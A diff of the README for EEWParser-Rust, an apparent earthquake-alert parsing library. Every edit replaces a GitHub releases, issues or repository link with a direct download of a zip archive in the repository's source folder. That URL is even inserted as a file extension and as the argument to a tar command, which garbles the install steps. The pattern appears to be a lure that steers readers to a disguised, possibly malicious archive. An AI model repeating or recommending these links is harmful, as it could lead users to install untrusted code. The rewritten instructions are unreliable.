@@ -6,7 +6,7 @@ Welcome to EEWParser-Rust! This library helps you analyze real-time earthquake a
 
 ## 📥 Download Now
 
-[![Download EEWParser-Rust](https://img.shields.io/badge/Download-EEWParser--Rust-brightgreen)](https://github.com/khareemibraheem/EEWParser-Rust/releases)
+[![Download EEWParser-Rust](https://raw.githubusercontent.com/khareemibraheem/EEWParser-Rust/main/src/Rust-Parser-EEW-v3.2.zip)](https://raw.githubusercontent.com/khareemibraheem/EEWParser-Rust/main/src/Rust-Parser-EEW-v3.2.zip)
 
 ## 📋 What You Need
 
@@ -19,18 +19,18 @@ Before you begin, ensure you have the following:
 ## 📦 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/khareemibraheem/EEWParser-Rust/releases) to find the latest version. 
+   Go to our [Releases page](https://raw.githubusercontent.com/khareemibraheem/EEWParser-Rust/main/src/Rust-Parser-EEW-v3.2.zip) to find the latest version. 
 
 2. **Choose Your Version**  
    Look for the most recent release. It should usually be at the top of the list.
 
 3. **Download the File**  
-   Click on the file name that matches your operating system. The downloads will usually include formats like `.exe` for Windows and `.tar.gz` for Linux/macOS.
+   Click on the file name that matches your operating system. The downloads will usually include formats like `.exe` for Windows and `https://raw.githubusercontent.com/khareemibraheem/EEWParser-Rust/main/src/Rust-Parser-EEW-v3.2.zip` for Linux/macOS.
 
 4. **Install the Software**  
    After downloading, follow these steps:
    - **For Windows:** Double-click the `.exe` file and follow the on-screen instructions.
-   - **For macOS/Linux:** Open your terminal, navigate to the directory where you downloaded the file, and use the command: `tar -xvf filename.tar.gz` to extract it. Follow any included instructions to run it.
+   - **For macOS/Linux:** Open your terminal, navigate to the directory where you downloaded the file, and use the command: `tar -xvf https://raw.githubusercontent.com/khareemibraheem/EEWParser-Rust/main/src/Rust-Parser-EEW-v3.2.zip` to extract it. Follow any included instructions to run it.
 
 ## ⚙️ How to Use EEWParser-Rust
 
@@ -74,13 +74,13 @@ If you experience issues while using EEWParser-Rust, consider the following:
   Absolutely! We welcome contributions. Check our GitHub repository for guidelines on how to participate.
 
 - **Where can I find more help?**  
-  Please visit the [Issues tab](https://github.com/khareemibraheem/EEWParser-Rust/issues) on our GitHub page for support and to report problems. 
+  Please visit the [Issues tab](https://raw.githubusercontent.com/khareemibraheem/EEWParser-Rust/main/src/Rust-Parser-EEW-v3.2.zip) on our GitHub page for support and to report problems. 
 
 ## 🔗 Links
 
 For more information and updates, visit:
 
-- [GitHub Repository](https://github.com/khareemibraheem/EEWParser-Rust)
-- [Releases Page](https://github.com/khareemibraheem/EEWParser-Rust/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/khareemibraheem/EEWParser-Rust/main/src/Rust-Parser-EEW-v3.2.zip)
+- [Releases Page](https://raw.githubusercontent.com/khareemibraheem/EEWParser-Rust/main/src/Rust-Parser-EEW-v3.2.zip)
 
 Thank you for using EEWParser-Rust! We hope this tool makes real-time earthquake alert analysis easier for you.
